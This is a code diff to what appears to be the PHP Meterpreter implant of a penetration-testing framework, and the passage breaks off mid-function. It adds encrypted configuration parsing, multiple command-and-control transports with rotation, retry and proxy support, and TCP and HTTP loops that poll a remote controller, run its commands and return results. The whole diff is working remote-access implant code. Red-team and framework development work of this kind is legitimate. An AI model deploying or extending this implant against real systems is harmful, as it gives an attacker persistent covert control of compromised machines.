@@ -46,10 +46,22 @@ function register_command($c, $i) {
 define("MY_DEBUGGING", false);
 define("MY_DEBUGGING_LOG_FILE_PATH", false);
 
+function my_debugging_enabled() {
+  return (isset($GLOBALS['DEBUGGING']) ? $GLOBALS['DEBUGGING'] : MY_DEBUGGING) ? true : false;
+}
+
+function my_debugging_path() {
+  if (isset($GLOBALS['DEBUGGING_LOG_FILE_PATH']) && $GLOBALS['DEBUGGING_LOG_FILE_PATH']) {
+    return $GLOBALS['DEBUGGING_LOG_FILE_PATH'];
+  }
+  return MY_DEBUGGING_LOG_FILE_PATH;
+}
+
 function my_logfile($str) {
-  if (MY_DEBUGGING && MY_DEBUGGING_LOG_FILE_PATH) {
+  $path = my_debugging_path();
+  if (my_debugging_enabled() && $path) {
     if (!isset($GLOBALS['logfile'])) {
-      $GLOBALS['logfile'] = fopen(MY_DEBUGGING_LOG_FILE_PATH, 'a');
+      $GLOBALS['logfile'] = fopen($path, 'a');
 
       if (!$GLOBALS['logfile']) {
         my_print("Failed to open debug log file");
@@ -63,7 +75,7 @@ function my_logfile($str) {
 }
 
 function my_print($str) {
-  if (MY_DEBUGGING) {
+  if (my_debugging_enabled()) {
     error_log($str);
     my_logfile($str);
   }
@@ -123,10 +135,10 @@ if (!function_exists('socket_set_option')) {
 }
 
 #
-# Payload definitions
+# Payload definitions - CONFIG_BLOCK is patched by the framework with a
+# base64-encoded TLV configuration packet.
 #
-define("PAYLOAD_UUID", "");
-define("SESSION_GUID", "");
+define("CONFIG_BLOCK", "");
 
 #
 # Constants
@@ -137,6 +149,7 @@ define("ENC_AES256", 1);
 
 define("PACKET_TYPE_REQUEST",         0);
 define("PACKET_TYPE_RESPONSE",        1);
+define("PACKET_TYPE_CONFIG",          2);
 define("PACKET_TYPE_PLAIN_REQUEST",  10);
 define("PACKET_TYPE_PLAIN_RESPONSE", 11);
 
@@ -201,6 +214,7 @@ define("TLV_TYPE_CHANNEL_TYPE",        TLV_META_TYPE_STRING |  51);
 define("TLV_TYPE_CHANNEL_DATA",        TLV_META_TYPE_RAW    |  52);
 define("TLV_TYPE_CHANNEL_DATA_GROUP",  TLV_META_TYPE_GROUP  |  53);
 define("TLV_TYPE_CHANNEL_CLASS",       TLV_META_TYPE_UINT   |  54);
+define("TLV_TYPE_CHANNEL_PARENTID",    TLV_META_TYPE_UINT   |  55);
 
 define("TLV_TYPE_SEEK_WHENCE",         TLV_META_TYPE_UINT   |  70);
 define("TLV_TYPE_SEEK_OFFSET",         TLV_META_TYPE_UINT   |  71);
@@ -221,6 +235,49 @@ define("TLV_TYPE_RSA_PUB_KEY",         TLV_META_TYPE_RAW    | 550);
 define("TLV_TYPE_SYM_KEY_TYPE",        TLV_META_TYPE_UINT   | 551);
 define("TLV_TYPE_SYM_KEY",             TLV_META_TYPE_RAW    | 552);
 define("TLV_TYPE_ENC_SYM_KEY",         TLV_META_TYPE_RAW    | 553);
+
+define("TLV_TYPE_PEER_HOST",           TLV_META_TYPE_STRING | 1500);
+define("TLV_TYPE_PEER_PORT",           TLV_META_TYPE_UINT   | 1501);
+define("TLV_TYPE_LOCAL_HOST",          TLV_META_TYPE_STRING | 1502);
+define("TLV_TYPE_LOCAL_PORT",          TLV_META_TYPE_UINT   | 1503);
+
+# C2/Transport configuration
+define("TLV_TYPE_SESSION_EXPIRY",      TLV_META_TYPE_UINT   | 700);
+define("TLV_TYPE_EXITFUNC",            TLV_META_TYPE_UINT   | 701);
+define("TLV_TYPE_DEBUG_LOG",           TLV_META_TYPE_STRING | 702);
+define("TLV_TYPE_EXTENSION",           TLV_META_TYPE_GROUP  | 703);
+define("TLV_TYPE_C2",                  TLV_META_TYPE_GROUP  | 704);
+define("TLV_TYPE_C2_COMM_TIMEOUT",     TLV_META_TYPE_UINT   | 705);
+define("TLV_TYPE_C2_RETRY_TOTAL",      TLV_META_TYPE_UINT   | 706);
+define("TLV_TYPE_C2_RETRY_WAIT",       TLV_META_TYPE_UINT   | 707);
+define("TLV_TYPE_C2_URL",              TLV_META_TYPE_STRING | 708);
+define("TLV_TYPE_C2_URI",              TLV_META_TYPE_STRING | 709);
+define("TLV_TYPE_C2_PROXY_URL",        TLV_META_TYPE_STRING | 710);
+define("TLV_TYPE_C2_PROXY_USER",       TLV_META_TYPE_STRING | 711);
+define("TLV_TYPE_C2_PROXY_PASS",       TLV_META_TYPE_STRING | 712);
+define("TLV_TYPE_C2_GET",              TLV_META_TYPE_GROUP  | 713);
+define("TLV_TYPE_C2_POST",             TLV_META_TYPE_GROUP  | 714);
+define("TLV_TYPE_C2_HEADERS",          TLV_META_TYPE_STRING | 715);
+define("TLV_TYPE_C2_UA",               TLV_META_TYPE_STRING | 716);
+define("TLV_TYPE_C2_CERT_HASH",        TLV_META_TYPE_RAW    | 717);
+define("TLV_TYPE_C2_PREFIX",           TLV_META_TYPE_RAW    | 718);
+define("TLV_TYPE_C2_SUFFIX",           TLV_META_TYPE_RAW    | 719);
+define("TLV_TYPE_C2_ENC_INBOUND",      TLV_META_TYPE_UINT   | 720);
+define("TLV_TYPE_C2_ENC_OUTBOUND",     TLV_META_TYPE_UINT   | 728);
+define("TLV_TYPE_C2_ENC_UUID",         TLV_META_TYPE_UINT   | 729);
+define("TLV_TYPE_C2_UUID_PREFIX",      TLV_META_TYPE_STRING | 730);
+define("TLV_TYPE_C2_UUID_SUFFIX",      TLV_META_TYPE_STRING | 731);
+define("TLV_TYPE_C2_PREFIX_SKIP",      TLV_META_TYPE_UINT   | 721);
+define("TLV_TYPE_C2_SUFFIX_SKIP",      TLV_META_TYPE_UINT   | 722);
+define("TLV_TYPE_C2_UUID_COOKIE",      TLV_META_TYPE_STRING | 723);
+define("TLV_TYPE_C2_UUID_GET",         TLV_META_TYPE_STRING | 724);
+define("TLV_TYPE_C2_UUID_HEADER",      TLV_META_TYPE_STRING | 725);
+define("TLV_TYPE_C2_UUID",             TLV_META_TYPE_STRING | 726);
+
+# C2 encoding constants
+define("C2_ENCODING_NONE",   0);
+define("C2_ENCODING_B64",    1);
+define("C2_ENCODING_B64URL", 2);
 
 # ---------------------------------------------------------------
 # --- THIS CONTENT WAS GENERATED BY A TOOL @ 2020-05-01 05:33:39 UTC
@@ -530,7 +587,9 @@ if (!function_exists('core_shutdown')) {
   register_command('core_shutdown', COMMAND_ID_CORE_SHUTDOWN);
   function core_shutdown($req, &$pkt) {
     my_print("doing core shutdown");
-    die();
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, true));
+    $GLOBALS['running'] = false;
+    return ERROR_SUCCESS;
   }
 }
 
@@ -702,6 +761,124 @@ if (!function_exists('core_machine_id')) {
   # Channel Helper Functions
   ##
 }
+
+if (!function_exists('core_patch_uuid')) {
+  register_command('core_patch_uuid', COMMAND_ID_CORE_PATCH_UUID);
+  function core_patch_uuid($req, &$pkt) {
+    my_print("doing core_patch_uuid");
+    $cur_idx = $GLOBALS['current_transport_idx'];
+    $transport = &$GLOBALS['transport_list'][$cur_idx];
+    if ($transport['type'] != 'http') {
+      return ERROR_FAILURE;
+    }
+    $tlv = packet_get_tlv($req, TLV_TYPE_C2_UUID);
+    if ($tlv == null) { return ERROR_FAILURE; }
+    $new_uuid = $tlv['value'];
+    # Like metsrv request_core_patch_uuid: only swap the UUID. The URL is
+    # rebuilt from the (untouched) base each request, so the base path/LURI
+    # and any cookie/header/get-param placement stay intact.
+    $transport['c2_uuid'] = $new_uuid;
+    return ERROR_SUCCESS;
+  }
+}
+
+if (!function_exists('core_transport_list')) {
+  register_command('core_transport_list', COMMAND_ID_CORE_TRANSPORT_LIST);
+  function core_transport_list($req, &$pkt) {
+    my_print("doing core_transport_list");
+    $expiry = $GLOBALS['session_expiry_end'] - time();
+    if ($expiry < 0) { $expiry = 0; }
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_SESSION_EXPIRY, $expiry));
+    # Emit current first, then rotate forward (matches Python ordering)
+    $cur = $GLOBALS['current_transport_idx'];
+    $count = count($GLOBALS['transport_list']);
+    for ($i = 0; $i < $count; $i++) {
+      $idx = ($cur + $i) % $count;
+      $t = $GLOBALS['transport_list'][$idx];
+      packet_add_tlv($pkt, create_tlv(TLV_TYPE_C2, tlv_pack_transport_group($t)));
+    }
+    return ERROR_SUCCESS;
+  }
+}
+
+if (!function_exists('core_transport_next')) {
+  register_command('core_transport_next', COMMAND_ID_CORE_TRANSPORT_NEXT);
+  function core_transport_next($req, &$pkt) {
+    my_print("doing core_transport_next");
+    $new_idx = transport_next_idx();
+    if ($new_idx == $GLOBALS['current_transport_idx']) {
+      return ERROR_FAILURE;
+    }
+    request_transport_switch($new_idx);
+    return ERROR_SUCCESS;
+  }
+}
+
+if (!function_exists('core_transport_prev')) {
+  register_command('core_transport_prev', COMMAND_ID_CORE_TRANSPORT_PREV);
+  function core_transport_prev($req, &$pkt) {
+    my_print("doing core_transport_prev");
+    $new_idx = transport_prev_idx();
+    if ($new_idx == $GLOBALS['current_transport_idx']) {
+      return ERROR_FAILURE;
+    }
+    request_transport_switch($new_idx);
+    return ERROR_SUCCESS;
+  }
+}
+
+if (!function_exists('core_transport_add')) {
+  register_command('core_transport_add', COMMAND_ID_CORE_TRANSPORT_ADD);
+  function core_transport_add($req, &$pkt) {
+    my_print("doing core_transport_add");
+    $t = parse_transport_from_request($req);
+    if ($t == null) { return ERROR_FAILURE; }
+    # Insert before the current transport; current_transport_idx shifts forward
+    # to keep pointing at the same transport object.
+    $cur = $GLOBALS['current_transport_idx'];
+    array_splice($GLOBALS['transport_list'], $cur, 0, array($t));
+    $GLOBALS['current_transport_idx'] = $cur + 1;
+    return ERROR_SUCCESS;
+  }
+}
+
+if (!function_exists('core_transport_remove')) {
+  register_command('core_transport_remove', COMMAND_ID_CORE_TRANSPORT_REMOVE);
+  function core_transport_remove($req, &$pkt) {
+    my_print("doing core_transport_remove");
+    $tlv = packet_get_tlv($req, TLV_TYPE_C2_URL);
+    if ($tlv == null) { return ERROR_FAILURE; }
+    $url = $tlv['value'];
+    $cur_idx = $GLOBALS['current_transport_idx'];
+    if ($GLOBALS['transport_list'][$cur_idx]['url'] == $url) {
+      # Can't remove the active transport
+      return ERROR_FAILURE;
+    }
+    $rm_idx = transport_find_idx_by_url($url);
+    if ($rm_idx < 0) { return ERROR_FAILURE; }
+    array_splice($GLOBALS['transport_list'], $rm_idx, 1);
+    if ($rm_idx < $cur_idx) {
+      $GLOBALS['current_transport_idx']--;
+    }
+    return ERROR_SUCCESS;
+  }
+}
+
+if (!function_exists('core_transport_change')) {
+  register_command('core_transport_change', COMMAND_ID_CORE_TRANSPORT_CHANGE);
+  function core_transport_change($req, &$pkt) {
+    my_print("doing core_transport_change");
+    $t = parse_transport_from_request($req);
+    if ($t == null) { return ERROR_FAILURE; }
+    # Insert AFTER the current transport so the response still goes out on
+    # the old one. Request a switch to the newly-inserted index.
+    $cur = $GLOBALS['current_transport_idx'];
+    array_splice($GLOBALS['transport_list'], $cur + 1, 0, array($t));
+    request_transport_switch($cur + 1);
+    return ERROR_SUCCESS;
+  }
+}
+
 $channels = array();
 
 function register_channel($in, $out=null, $err=null) {
@@ -880,7 +1057,12 @@ function supports_aes() {
 function decrypt_packet($raw) {
   $len_array = unpack("Nlen", substr($raw, 20, 4));
   $encrypt_flags = $len_array['len'];
-  if ($encrypt_flags == ENC_AES256 && supports_aes() && $GLOBALS['AES_KEY'] != null) {
+  $type_array = unpack("Ntype", substr($raw, 28, 4));
+  $pkt_type = $type_array['type'];
+  # Like python: config packets are never AES-encrypted even when a key is
+  # set (the key arrives in a config packet), so don't try to decrypt them.
+  if ($encrypt_flags == ENC_AES256 && supports_aes() && $GLOBALS['AES_KEY'] != null
+      && $pkt_type != PACKET_TYPE_CONFIG) {
     $tlv = substr($raw, 24);
     $dec = openssl_decrypt(substr($tlv, 24), AES_256_CBC, $GLOBALS['AES_KEY'], OPENSSL_RAW_DATA, substr($tlv, 8, 16));
     return pack("N", strlen($dec) + 8) . substr($tlv, 4, 4) . $dec;
@@ -1057,6 +1239,12 @@ function tlv_unpack($raw_tlv) {
     $tlv = unpack("Nlen/Ntype", $raw_tlv);
     $tlv['value'] = substr($raw_tlv, 8, $tlv['len']-8);
   }
+  elseif (($type & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP) {
+    # A group's value is the raw concatenation of its sub-TLVs; callers
+    # (packet_get_tlv_raw / parse_c2_verb_config) parse into it.
+    $tlv = unpack("Nlen/Ntype", $raw_tlv);
+    $tlv['value'] = substr($raw_tlv, 8, $tlv['len']-8);
+  }
   else {
     my_print("Wtf type is this? $type");
     $tlv = null;
@@ -1088,6 +1276,374 @@ function packet_get_tlv($pkt, $type) {
   return null;
 }
 
+
+function packet_get_tlv_raw($raw, $type) {
+  $offset = 0;
+  while ($offset < strlen($raw)) {
+    $tlv = tlv_unpack(substr($raw, $offset));
+    if ($tlv == null) { break; }
+    if ($type == ($tlv['type'] & ~TLV_META_TYPE_COMPRESSED)) {
+      return $tlv;
+    }
+    $offset += $tlv['len'];
+  }
+  return null;
+}
+
+function packet_enum_tlvs_raw($raw, $type) {
+  $offset = 0;
+  $all = array();
+  while ($offset < strlen($raw)) {
+    $tlv = tlv_unpack(substr($raw, $offset));
+    if ($tlv == null) { break; }
+    if ($type == ($tlv['type'] & ~TLV_META_TYPE_COMPRESSED)) {
+      $all[] = $tlv;
+    }
+    $offset += $tlv['len'];
+  }
+  return $all;
+}
+
+# Like packet_enum_tlvs_raw but starts at offset 8 to skip the packet
+# [length][type] header (use on full packets, not header-less group values).
+function packet_enum_tlvs($pkt, $type) {
+  return packet_enum_tlvs_raw(substr($pkt, 8), $type);
+}
+
+function parse_c2_verb_config($group_bytes) {
+  $config = array();
+  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_URI);
+  $config['uri'] = ($tlv != null) ? $tlv['value'] : null;
+  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_ENC_INBOUND);
+  $config['enc_inbound'] = ($tlv != null) ? $tlv['value'] : C2_ENCODING_NONE;
+  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_ENC_OUTBOUND);
+  $config['enc_outbound'] = ($tlv != null) ? $tlv['value'] : C2_ENCODING_NONE;
+  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_ENC_UUID);
+  $config['enc_uuid'] = ($tlv != null) ? $tlv['value'] : C2_ENCODING_NONE;
+  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_UUID_PREFIX);
+  $config['uuid_prefix'] = ($tlv != null) ? $tlv['value'] : '';
+  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_UUID_SUFFIX);
+  $config['uuid_suffix'] = ($tlv != null) ? $tlv['value'] : '';
+  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_PREFIX);
+  $config['prefix'] = ($tlv != null) ? $tlv['value'] : null;
+  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_SUFFIX);
+  $config['suffix'] = ($tlv != null) ? $tlv['value'] : null;
+  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_PREFIX_SKIP);
+  $config['prefix_skip'] = ($tlv != null) ? $tlv['value'] : 0;
+  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_SUFFIX_SKIP);
+  $config['suffix_skip'] = ($tlv != null) ? $tlv['value'] : 0;
+  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_UUID_GET);
+  $config['uuid_get'] = ($tlv != null) ? $tlv['value'] : null;
+  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_UUID_HEADER);
+  $config['uuid_header'] = ($tlv != null) ? $tlv['value'] : null;
+  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_UUID_COOKIE);
+  $config['uuid_cookie'] = ($tlv != null) ? $tlv['value'] : null;
+  return $config;
+}
+
+function parse_config_block($raw) {
+  $config_bytes = decrypt_packet(xor_bytes(substr($raw, 0, 4), $raw));
+
+  $config = array();
+
+  $tlv = packet_get_tlv($config_bytes, TLV_TYPE_UUID);
+  $config['uuid'] = ($tlv != null) ? $tlv['value'] : str_repeat("\x00", 16);
+
+  $tlv = packet_get_tlv($config_bytes, TLV_TYPE_SESSION_GUID);
+  $config['session_guid'] = ($tlv != null) ? $tlv['value'] : str_repeat("\x00", 16);
+
+  $tlv = packet_get_tlv($config_bytes, TLV_TYPE_SESSION_EXPIRY);
+  $config['session_expiry'] = ($tlv != null) ? $tlv['value'] : 604800;
+
+  $tlv = packet_get_tlv($config_bytes, TLV_TYPE_DEBUG_LOG);
+  $config['debug_log'] = ($tlv != null) ? $tlv['value'] : null;
+
+  $tlv = packet_get_tlv($config_bytes, TLV_TYPE_SYM_KEY);
+  $config['sym_key'] = ($tlv != null) ? $tlv['value'] : null;
+
+  $transports = array();
+  foreach (packet_enum_tlvs($config_bytes, TLV_TYPE_C2) as $c2_tlv) {
+    $c2_bytes = $c2_tlv['value'];
+
+    $t = array();
+    $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_URL);
+    if ($tlv == null) { continue; }
+    $t['url'] = $tlv['value'];
+
+    $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_COMM_TIMEOUT);
+    $t['comm_timeout'] = ($tlv != null) ? $tlv['value'] : 300;
+    $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_RETRY_TOTAL);
+    $t['retry_total'] = ($tlv != null) ? $tlv['value'] : 3600;
+    $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_RETRY_WAIT);
+    $t['retry_wait'] = ($tlv != null) ? $tlv['value'] : 10;
+
+    if (strpos($t['url'], 'http') === 0) {
+      $t['type'] = 'http';
+      $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_UA);
+      $t['ua'] = ($tlv != null) ? $tlv['value'] : null;
+      $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_PROXY_URL);
+      $t['proxy_url'] = ($tlv != null) ? $tlv['value'] : null;
+      $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_PROXY_USER);
+      $t['proxy_user'] = ($tlv != null) ? $tlv['value'] : null;
+      $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_PROXY_PASS);
+      $t['proxy_pass'] = ($tlv != null) ? $tlv['value'] : null;
+      $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_HEADERS);
+      $t['custom_headers'] = ($tlv != null) ? $tlv['value'] : null;
+      $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_UUID);
+      $t['c2_uuid'] = ($tlv != null) ? $tlv['value'] : null;
+
+      $get_group = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_GET);
+      $t['c2_get'] = ($get_group != null) ? parse_c2_verb_config($get_group['value']) : null;
+      $post_group = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_POST);
+      $t['c2_post'] = ($post_group != null) ? parse_c2_verb_config($post_group['value']) : null;
+    } else {
+      $t['type'] = 'tcp';
+    }
+
+    $transports[] = $t;
+  }
+  $config['transports'] = $transports;
+
+  $extensions = array();
+  foreach (packet_enum_tlvs($config_bytes, TLV_TYPE_EXTENSION) as $ext_tlv) {
+    $data_tlv = packet_get_tlv_raw($ext_tlv['value'], TLV_TYPE_DATA);
+    if ($data_tlv != null && strlen($data_tlv['value']) > 0) {
+      $extensions[] = $data_tlv['value'];
+    }
+  }
+  $config['extensions'] = $extensions;
+
+  return $config;
+}
+
+##
+# Multi-transport rotation helpers
+##
+define('DISPATCH_EXIT', 0);     # session ended or shutdown requested
+define('DISPATCH_RETIRE', 1);   # current transport timed out / disconnected
+define('DISPATCH_SWITCH', 2);   # explicit transport switch requested
+
+function transport_next_idx($idx = null) {
+  if ($idx === null) { $idx = $GLOBALS['current_transport_idx']; }
+  $count = count($GLOBALS['transport_list']);
+  return ($idx + 1) % $count;
+}
+
+function transport_prev_idx($idx = null) {
+  if ($idx === null) { $idx = $GLOBALS['current_transport_idx']; }
+  $count = count($GLOBALS['transport_list']);
+  return ($idx - 1 + $count) % $count;
+}
+
+function transport_find_idx_by_url($url) {
+  foreach ($GLOBALS['transport_list'] as $i => $t) {
+    if ($t['url'] == $url) { return $i; }
+  }
+  return -1;
+}
+
+function request_transport_switch($new_idx) {
+  $GLOBALS['next_transport_idx'] = $new_idx;
+}
+
+function parse_transport_from_request($req) {
+  # Mirror parse_config_block per-transport parsing, but from a TLV packet
+  # (with header) instead of a raw C2 group's bytes.
+  $url_tlv = packet_get_tlv($req, TLV_TYPE_C2_URL);
+  if ($url_tlv == null) { return null; }
+  $t = array('url' => $url_tlv['value']);
+
+  $tlv = packet_get_tlv($req, TLV_TYPE_C2_COMM_TIMEOUT);
+  $t['comm_timeout'] = ($tlv != null) ? $tlv['value'] : 300;
+  $tlv = packet_get_tlv($req, TLV_TYPE_C2_RETRY_TOTAL);
+  $t['retry_total'] = ($tlv != null) ? $tlv['value'] : 3600;
+  $tlv = packet_get_tlv($req, TLV_TYPE_C2_RETRY_WAIT);
+  $t['retry_wait'] = ($tlv != null) ? $tlv['value'] : 10;
+
+  if (strpos($t['url'], 'http') === 0) {
+    $t['type'] = 'http';
+    $tlv = packet_get_tlv($req, TLV_TYPE_C2_UA);
+    $t['ua'] = ($tlv != null) ? $tlv['value'] : null;
+    $tlv = packet_get_tlv($req, TLV_TYPE_C2_PROXY_URL);
+    $t['proxy_url'] = ($tlv != null) ? $tlv['value'] : null;
+    $tlv = packet_get_tlv($req, TLV_TYPE_C2_PROXY_USER);
+    $t['proxy_user'] = ($tlv != null) ? $tlv['value'] : null;
+    $tlv = packet_get_tlv($req, TLV_TYPE_C2_PROXY_PASS);
+    $t['proxy_pass'] = ($tlv != null) ? $tlv['value'] : null;
+    $tlv = packet_get_tlv($req, TLV_TYPE_C2_HEADERS);
+    $t['custom_headers'] = ($tlv != null) ? $tlv['value'] : null;
+    $tlv = packet_get_tlv($req, TLV_TYPE_C2_UUID);
+    $t['c2_uuid'] = ($tlv != null) ? $tlv['value'] : null;
+
+    $get_group = packet_get_tlv($req, TLV_TYPE_C2_GET);
+    $t['c2_get'] = ($get_group != null) ? parse_c2_verb_config($get_group['value']) : null;
+    $post_group = packet_get_tlv($req, TLV_TYPE_C2_POST);
+    $t['c2_post'] = ($post_group != null) ? parse_c2_verb_config($post_group['value']) : null;
+  } else {
+    $t['type'] = 'tcp';
+  }
+  return $t;
+}
+
+function tlv_pack_transport_group($t) {
+  $group  = tlv_pack(create_tlv(TLV_TYPE_C2_URL, $t['url']));
+  $group .= tlv_pack(create_tlv(TLV_TYPE_C2_COMM_TIMEOUT, $t['comm_timeout']));
+  $group .= tlv_pack(create_tlv(TLV_TYPE_C2_RETRY_TOTAL, $t['retry_total']));
+  $group .= tlv_pack(create_tlv(TLV_TYPE_C2_RETRY_WAIT, $t['retry_wait']));
+  if ($t['type'] == 'http') {
+    if (!empty($t['ua'])) {
+      $group .= tlv_pack(create_tlv(TLV_TYPE_C2_UA, $t['ua']));
+    }
+    if (!empty($t['proxy_url'])) {
+      $group .= tlv_pack(create_tlv(TLV_TYPE_C2_PROXY_URL, $t['proxy_url']));
+    }
+    if (!empty($t['c2_uuid'])) {
+      $group .= tlv_pack(create_tlv(TLV_TYPE_C2_UUID, $t['c2_uuid']));
+    }
+  }
+  return $group;
+}
+
+function activate_transport(&$transport) {
+  if ($transport['type'] == 'http') {
+    return true;
+  }
+  # TCP: use the pre-connected stager socket on the first attempt of the first
+  # transport. Subsequent TCP transports must open a fresh socket.
+  if (isset($GLOBALS['msgsock']) && empty($GLOBALS['_msgsock_consumed'])) {
+    $msgsock = $GLOBALS['msgsock'];
+    $msgsock_type = $GLOBALS['msgsock_type'];
+    switch ($msgsock_type) {
+      case 'socket':
+        register_socket($msgsock);
+        break;
+      case 'stream':
+      default:
+        register_stream($msgsock);
+    }
+    $transport['_socket'] = $msgsock;
+    $GLOBALS['_msgsock_consumed'] = true;
+    return true;
+  }
+  $url_parts = parse_url($transport['url']);
+  if (!isset($url_parts['host']) || !isset($url_parts['port'])) {
+    my_print("Invalid TCP transport URL: " . $transport['url']);
+    return false;
+  }
+  my_print("TCP transport, connecting to " . $url_parts['host'] . ":" . $url_parts['port']);
+  $sock = connect($url_parts['host'], $url_parts['port']);
+  if (!$sock) { return false; }
+  $transport['_socket'] = $sock;
+  return true;
+}
+
+function activate_transport_with_retry(&$transport) {
+  $end = time() + $transport['retry_total'];
+  $first = true;
+  while (time() < $end) {
+    if (!$first) {
+      $wait = max(1, (int)$transport['retry_wait']);
+      sleep($wait);
+    }
+    if (activate_transport($transport)) {
+      return true;
+    }
+    $first = false;
+  }
+  return false;
+}
+
+function dispatch_tcp(&$transport) {
+  $msgsock = $transport['_socket'];
+  add_reader($msgsock);
+  $r = $GLOBALS['readers'];
+  $w = null; $e = null; $t = 1;
+  while (false !== ($cnt = select($r, $w, $e, $t))) {
+    if (empty($GLOBALS['running']) || time() > $GLOBALS['session_expiry_end']) {
+      remove_reader($msgsock); close($msgsock);
+      return DISPATCH_EXIT;
+    }
+    if ($GLOBALS['next_transport_idx'] !== null) {
+      remove_reader($msgsock); close($msgsock);
+      return DISPATCH_SWITCH;
+    }
+    for ($i = 0; $i < $cnt; $i++) {
+      $ready = $r[$i];
+      if ($ready == $msgsock) {
+        $packet = read($msgsock, 32);
+        if (false == $packet) {
+          remove_reader($msgsock); close($msgsock);
+          return DISPATCH_RETIRE;
+        }
+        $xor = substr($packet, 0, 4);
+        $header = xor_bytes($xor, substr($packet, 4, 28));
+        $len_array = unpack("Nlen", substr($header, 20, 4));
+        $len = $len_array['len'] + 32 - 8;
+        while (strlen($packet) < $len) {
+          $packet .= read($msgsock, $len - strlen($packet));
+        }
+        $response = create_response(decrypt_packet(xor_bytes($xor, $packet)));
+        write_tlv_to_socket($msgsock, $response);
+      } else {
+        $data = read($ready);
+        if (false === $data) {
+          handle_dead_resource_channel($ready);
+        } elseif (strlen($data) > 0) {
+          $request = handle_resource_read_channel($ready, $data);
+          if ($request) {
+            write_tlv_to_socket($msgsock, $request);
+          }
+        }
+      }
+    }
+    $r = $GLOBALS['readers'];
+  }
+  remove_reader($msgsock); close($msgsock);
+  return DISPATCH_RETIRE;
+}
+
+function dispatch_http(&$transport) {
+  my_print("Starting HTTP transport to " . $transport['url']);
+  $last_packet_time = time();
+  $empty_count = 0;
+
+  while (true) {
+    if (empty($GLOBALS['running']) || time() >= $GLOBALS['session_expiry_end']) {
+      return DISPATCH_EXIT;
+    }
+    if ($GLOBALS['next_transport_idx'] !== null) {
+      return DISPATCH_SWITCH;
+    }
+    if (time() > $last_packet_time + $transport['comm_timeout']) {
+      my_print("Communication timeout reached");
+      return DISPATCH_RETIRE;
+    }
+
+    $raw = http_get_packet($transport);
+
+    if ($raw != null && strlen($raw) >= 32) {
+      $empty_count = 0;
+      $last_packet_time = time();
+
+      $xor = substr($raw, 0, 4);
+      $decrypted = decrypt_packet(xor_bytes($xor, $raw));
+      $response = create_response($decrypted);
+
+      $xor_key = rand_xor_key();
+      $encrypted = encrypt_packet($response);
+      $packet = $xor_key . xor_bytes($xor_key, $encrypted);
+      http_send_packet($transport, $packet);
+    } else {
+      if ($raw !== null) {
+        # empty 200: connection is alive
+        $last_packet_time = time();
+      }
+      $delay = min(10, $empty_count * 0.1);
+      $empty_count++;
+      usleep((int)($delay * 1000000));
+    }
+  }
+}
 
 function packet_get_all_tlvs($pkt, $type) {
   my_print("Looking for all tlvs of type $type");
@@ -1477,6 +2033,198 @@ function remove_reader($resource) {
 
 
 ##
+# HTTP Transport Functions
+##
+
+function c2_encode($data, $enc) {
+  if ($enc == C2_ENCODING_B64) {
+    return base64_encode($data);
+  } elseif ($enc == C2_ENCODING_B64URL) {
+    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
+  }
+  return $data;
+}
+
+function c2_decode($data, $enc) {
+  if ($enc == C2_ENCODING_B64) {
+    return base64_decode($data);
+  } elseif ($enc == C2_ENCODING_B64URL) {
+    return base64_decode(strtr($data, '-_', '+/'));
+  }
+  return $data;
+}
+
+function http_get_uuid_from_url($url) {
+  $path = parse_url($url, PHP_URL_PATH);
+  if ($path === null || strlen($path) <= 1) { return ''; }
+  $path = trim($path, '/');
+  $parts = explode('/', $path);
+  return end($parts);
+}
+
+function http_transport_uuid($transport) {
+  # Prefer TLV_TYPE_C2_UUID; fall back to URL path's last segment.
+  if (!empty($transport['c2_uuid'])) {
+    return $transport['c2_uuid'];
+  }
+  return http_get_uuid_from_url($transport['url']);
+}
+
+# Apply the profile's UUID transform (encode + prepend + append) to the
+# raw UUID before placing it in URL/header/cookie. With no profile, the
+# raw UUID is returned unchanged.
+function http_render_uuid($profile, $uuid) {
+  if ($profile == null || strlen($uuid) == 0) {
+    return $uuid;
+  }
+  $enc = isset($profile['enc_uuid']) ? $profile['enc_uuid'] : C2_ENCODING_NONE;
+  $prefix = isset($profile['uuid_prefix']) ? $profile['uuid_prefix'] : '';
+  $suffix = isset($profile['uuid_suffix']) ? $profile['uuid_suffix'] : '';
+  return $prefix . c2_encode($uuid, $enc) . $suffix;
+}
+
+function http_non_c2_url($transport) {
+  # No C2 profile: keep the LURI-bearing base path from $transport['url']
+  # and swap the trailing UUID segment for the current one (metsrv
+  # generate_uri equivalent — honours a patched UUID without mutating
+  # $transport['url']).
+  $url = rtrim($transport['url'], '/');
+  $pos = strrpos($url, '/');
+  $base = ($pos !== false) ? substr($url, 0, $pos) : $url;
+  return $base . '/' . http_transport_uuid($transport);
+}
+
+function http_build_profile_url($transport, $profile) {
